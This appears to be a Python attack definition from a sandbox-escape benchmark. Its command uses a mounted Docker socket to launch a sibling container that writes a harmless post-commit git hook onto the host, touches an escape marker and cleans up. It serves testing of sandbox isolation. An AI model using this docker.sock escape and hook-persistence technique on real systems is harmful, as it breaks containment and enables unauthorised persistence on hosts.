"""Persistence via a git hook (LINUX.md catalogue: "... .git/hooks ...
outside the sandbox"). Same escape vector as escape_docker_socket.py,
persist_bashrc.py and persist_crontab.py -- a mounted docker.sock spawns a
sibling container with a host bind-mount -- but this one needs no pre-existing
target: it creates its OWN throwaway git repo on the host (under
/var/sbx-bench, already mounted for the escape marker), installs a
`post-commit` hook into it, and tears the whole repo down again, all inside
one sibling-container invocation. This stays self-contained on purpose: a
`git init` done as the sibling container's root makes every file inside that
repo root-owned, which `bench` cannot delete afterward (confirmed live: a
follow-up `rm -rf` from the harness side failed with "Permission denied" on
every object under .git) -- so cleanup has to happen as root, in the same
container, before it exits.

The hook script is `#!/bin/sh` followed by one `#` comment line -- syntactically
a valid, executable hook, but one that does nothing at all even if it were
left behind and a commit actually triggered it.

Needs `git` inside the alpine:3.20 image, installed via `apk add` in the same
command (confirmed live: ~2s total including the package install, well inside
this attack's timeout budget) rather than switching the base image, since
docker:27-cli (the image escape_docker_socket/persist_bashrc/persist_crontab
already use) has no git either and pulling a third image just for this one
attack isn't worth it.
"""
from .base import Attack

ATTACK = Attack(
    name="persist_git_hooks",
    category="persistence",
    description="Use a mounted docker.sock to install a post-commit hook in a throwaway repo it creates and removes, outside the sandbox",
    targets=("docker", "gvisor"),  # same scope as escape_docker_socket -- see that module's docstring
    command=(
        "timeout {timeout_margin} docker run --rm "
        "-v /var/sbx-bench:/var/sbx-bench alpine:3.20 sh -c "
        "'apk add --no-cache git -q && "
        "git init -q /var/sbx-bench/persist-git-test && "
        "printf \"#!/bin/sh\\n# sbx-bench-persist-marker\\n\" "
        "> /var/sbx-bench/persist-git-test/.git/hooks/post-commit && "
        "chmod +x /var/sbx-bench/persist-git-test/.git/hooks/post-commit && "
        "touch {escape_marker} && "
        "rm -rf /var/sbx-bench/persist-git-test'"
    ),
    config={
        "volumes": {"/var/run/docker.sock": "/var/run/docker.sock"},
        "image": "docker:27-cli",
    },
    timeout=25.0,  # a little more headroom than the other two: apk add adds a step
    notes=(
        "Misconfigured variant by construction, same as escape_docker_socket -- "
        "the config IS the vulnerability. Negative control (config=None): no "
        "docker client in the default image at all, fails outright before it "
        "can even attempt the mount.\n"
        "Verified live on sbx-test: hook file written with the expected "
        "content, escape marker touched, whole throwaway repo removed "
        "afterward (confirmed empty /var/sbx-bench/ left behind) -- took "
        "~2.1s end to end including the apk install."
    ),
)
